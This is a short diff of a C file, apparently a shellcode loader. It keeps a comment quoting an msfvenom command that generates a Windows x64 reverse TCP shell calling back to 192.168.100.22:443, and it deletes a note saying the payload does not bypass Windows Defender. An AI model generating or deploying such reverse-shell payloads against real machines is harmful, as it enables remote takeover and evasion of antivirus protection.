@@ -1,5 +1,5 @@
  /* Generated using msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.22 LPORT=443 -f c -b \x00\x0a\x0d  */
- /* This does not bypass windows 10 defender  */
+
 
 #include "Windows.h"
 
